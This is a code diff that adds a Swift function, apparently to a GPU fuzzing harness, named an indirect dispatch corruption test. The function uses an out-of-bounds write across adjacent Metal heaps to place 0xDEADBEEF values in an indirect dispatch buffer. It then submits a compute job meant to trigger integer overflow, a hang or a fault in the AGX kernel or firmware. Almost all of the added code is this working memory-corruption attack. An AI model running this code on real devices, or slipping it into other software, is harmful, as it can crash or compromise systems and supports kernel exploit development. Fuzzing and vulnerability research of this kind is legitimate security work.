@@ -400,6 +400,119 @@ func runArgBufferCorruption(log: FuzzLog, completion: @escaping () -> Void) {
     }
 }
 
+// Indirect dispatch corruption.
+// Write 0xDEADBEEF into h1 via OOB, then use h1 as an indirect dispatch buffer.
+// AGX kernel scheduler reads the buffer to get thread grid dimensions before GPU launch.
+// Poison bytes (3.7B thread groups) → either AGX driver integer overflow or GPU hang/watchdog.
+func runGPUIndirectDispatch(log: FuzzLog, completion: @escaping () -> Void) {
+    DispatchQueue.global(qos: .userInitiated).async {
+        let sl = SyncLog()
+        func step(_ s: String) { sl.write(s); log.append(s) }
+
+        guard let device = MTLCreateSystemDefaultDevice() else { step("✗ No Metal device"); completion(); return }
+        guard let queue  = device.makeCommandQueue() else { step("✗ No command queue"); completion(); return }
+        step("── GPU Indirect Dispatch Corruption ─────────")
+
+        let hd = MTLHeapDescriptor(); hd.size = 4096; hd.storageMode = .shared
+        guard let h0 = device.makeHeap(descriptor: hd),
+              let h1 = device.makeHeap(descriptor: hd) else { step("heap nil"); completion(); return }
+        let actual = h0.size
+
+        guard let b0 = h0.makeBuffer(length: actual, options: .storageModeShared),
+              let b1 = h1.makeBuffer(length: actual, options: .storageModeShared) else { step("buf nil"); completion(); return }
+
+        let p0 = b0.contents().assumingMemoryBound(to: UInt8.self)
+        let p1 = b1.contents().assumingMemoryBound(to: UInt8.self)
+        let va0 = UInt(bitPattern: p0)
+        let va1 = UInt(bitPattern: p1)
+        let dist = va1 > va0 ? va1 - va0 : va0 - va1
+
+        step("va0=0x\(String(va0,radix:16)) va1=0x\(String(va1,radix:16)) dist=0x\(String(dist,radix:16))")
+        guard dist == UInt(actual) else { step("✗ not adjacent — retry"); completion(); return }
+        step("✓ adjacent")
+
+        // Verify cross-heap read
+        for i in 0..<actual { p1[i] = 0xAA }
+        guard p0[actual] == 0xAA else { step("✗ sentinel miss"); completion(); return }
+        step("✓ cross-heap read confirmed")
+
+        // MTLDispatchThreadgroupsIndirectArguments layout:
+        // uint32 threadgroupsX, uint32 threadgroupsY, uint32 threadgroupsZ  (12 bytes total)
+        // Write 0xDEADBEEF into all three fields via h0 OOB
+        let poisonU32: UInt32 = 0xDEADBEEF
+        step("── Writing indirect dispatch args via h0 OOB ──")
+        step("  poisoning threadgroupsX/Y/Z = 0x\(String(poisonU32,radix:16)) each")
+        // Write 3 × UInt32 little-endian into h1[0..11]
+        for field in 0..<3 {
+            var v = poisonU32
+            for b in 0..<4 {
+                p0[actual + field*4 + b] = UInt8(v & 0xFF)
+                v >>= 8
+            }
+        }
+        // Verify
+        var readback: UInt32 = 0
+        for b in 0..<4 { readback |= UInt32(p1[b]) << (b*8) }
+        step("  h1[0..3] readback = 0x\(String(readback,radix:16)) (expect 0xdeadbeef)")
+
+        // Build a trivial Metal compute pipeline (empty kernel)
+        // Must have a real compiled function — use a precompiled library approach:
+        // simplest: device.makeDefaultLibrary() looks for default.metallib in the bundle.
+        // If not present, use makeComputePipelineState with a dynamic-compiled function.
+        let src = """
+        #include <metal_stdlib>
+        using namespace metal;
+        kernel void noop(uint id [[thread_position_in_grid]]) {}
+        """
+        step("── Compiling noop compute shader ──")
+        let lib: MTLLibrary
+        let fn:  MTLFunction
+        let pso: MTLComputePipelineState
+        do {
+            let opts = MTLCompileOptions()
+            lib = try device.makeLibrary(source: src, options: opts)
+            guard let f = lib.makeFunction(named: "noop") else { step("fn nil"); completion(); return }
+            fn  = f
+            pso = try device.makeComputePipelineState(function: fn)
+        } catch {
+            step("✗ shader compile failed: \(error.localizedDescription)"); completion(); return
+        }
+        step("  shader compiled OK")
+
+        // Encode indirect dispatch using b1 as the indirect args buffer (contains our poison)
+        guard let cmdBuf = queue.makeCommandBuffer() else { step("cmdBuf nil"); completion(); return }
+        guard let enc = cmdBuf.makeComputeCommandEncoder() else { step("enc nil"); completion(); return }
+        enc.setComputePipelineState(pso)
+        // dispatchThreadgroups(indirectBuffer:) — AGX kernel reads b1[0..11] as grid size
+        enc.dispatchThreadgroups(indirectBuffer: b1,
+                                  indirectBufferOffset: 0,
+                                  threadsPerThreadgroup: MTLSize(width: 1, height: 1, depth: 1))
+        enc.endEncoding()
+
+        cmdBuf.addCompletedHandler { cb in
+            let status = cb.status
+            let err    = cb.error?.localizedDescription ?? "none"
+            switch status {
+            case .completed:
+                step("  cmdBuf COMPLETED — AGX accepted 0xDEADBEEF thread groups without fault")
+                step("  AGX either clamped or dispatched the value (GPU firmware handled it)")
+            case .error:
+                step("  *** cmdBuf ERROR — AGX faulted on 0xDEADBEEF indirect dispatch")
+                step("  *** error: \(err)")
+                step("  *** AGX KERNEL/FIRMWARE PATH HIT — scheduler read our OOB bytes as grid dimensions")
+            default:
+                step("  status=\(status.rawValue) err=\(err)")
+            }
+            step("── Indirect Dispatch Corruption complete ─────")
+            completion()
+        }
+
+        step("  commit (dispatching 0x\(String(poisonU32,radix:16))^3 thread groups)…")
+        sl.write("LAST STEP BEFORE GPU SUBMIT — if crash here, AGX scheduler faulted")
+        cmdBuf.commit()
+    }
+}
+
 // Heap boundary cross test.
 // Heaps are spaced exactly actual_size=16384 bytes apart (confirmed via spray).
 // Heaps are CONTIGUOUS — no padding. ptr[actual_size] of heap[0] = ptr[0] of heap[1].
